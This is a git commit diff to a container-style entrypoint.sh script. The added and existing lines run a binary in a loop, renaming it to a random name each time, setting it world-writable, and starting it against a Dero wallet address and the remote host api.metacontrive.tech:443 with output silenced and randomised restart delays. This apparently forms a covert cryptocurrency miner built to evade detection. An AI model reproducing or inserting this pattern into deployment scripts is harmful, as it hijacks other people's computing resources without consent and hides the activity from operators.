1db6fe6dab107a4d7133a4df8346e088581778cd
humaldostangos <133825175+humaldostangos@users.noreply.github.com>
2023-05-17 01:09:14 +0100

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,5 +1,10 @@
 #!/bin/sh
-nohup npm
+
+# Function to generate a random delay between 10 and 60 seconds
+generate_random_delay() {
+  delay=$((10 + RANDOM % 51))
+  echo "Delay: $delay seconds"
+}
 
 # Function to generate a random 9-digit alphanumeric name
 generate_random_name() {
@@ -9,14 +14,12 @@ generate_random_name() {
 # Function to rename and restart the main executable
 restart_main() {
   while true; do
+    generate_random_delay
     generate_random_name
     mv main "$new_name"
     chmod 777 "$new_name"
     ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
-    
-    # Generate a random wait period between 10 and 60 seconds
-    # wait_seconds=$(shuf -i 10-60 -n 1)
-    # sleep "$wait_seconds"
+    sleep "$delay"
   done
 }
 
@@ -25,3 +28,4 @@ trap 'exit 0' SIGINT SIGTERM
 
 # Call the function to rename and restart the main executable
 restart_main
+
